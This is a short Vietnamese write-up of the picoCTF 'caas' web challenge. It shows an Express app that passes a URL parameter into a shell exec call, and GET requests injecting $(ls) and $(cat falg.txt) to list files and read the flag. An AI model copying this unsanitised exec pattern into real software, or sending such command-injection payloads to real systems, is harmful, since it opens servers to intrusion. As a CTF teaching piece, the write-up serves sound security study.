# ccas
##### Tags: `picoMini by redpwn` `Web Exploitation`
### DESCRIPTION
Now presenting [cowsay as a service](https://caas.mars.picoctf.net/)
#####
CHALLENGE ENDPOINTS: [index.js](https://artifacts.picoctf.net/picoMini+by+redpwn/Web+Exploitation/caas/index.js)
> caas hay Cowsay là một chương trình vui của UNIX khi tạo ra bức tranh của một chú bò nói những dòng tin mà người dùng tạo ra.
##### Sử dụng BurpSuite để forward Request trong Repeater để xem phản ứng của trang web:
```
HTTP/2 200 OK

Content-Type: text/plain; charset=utf-8

Date: Mon, 11 Mar 2024 14:13:56 GMT

Etag: W/"97-2+ewzTQiX8jk22CNOwuSfHKQur4"

X-Powered-By: Express

Content-Length: 151



 _______
< yoooo >
 -------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```
##### Kiểm tra file endpoint index.js:
```javascript
const express = require('express');
const app = express();
const { exec } = require('child_process');

app.use(express.static('public'));

app.get('/cowsay/:message', (req, res) => {
  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
});

app.listen(3000, () => {
  console.log('listening');
});

```
> Thấy trang web có lỗ hổng khi sử dụng `exec` mà không có sử lý input hợp lý.
##### Sử dụng `GET` trong request như sau để tìm flag:
```
GET https://caas.mars.picoctf.net/cowsay/$(ls) HTTP/2
GET https://caas.mars.picoctf.net/cowsay/$(cat falg.txt) HTTP/2
```
##### =>  Lấy flag thành công!
    
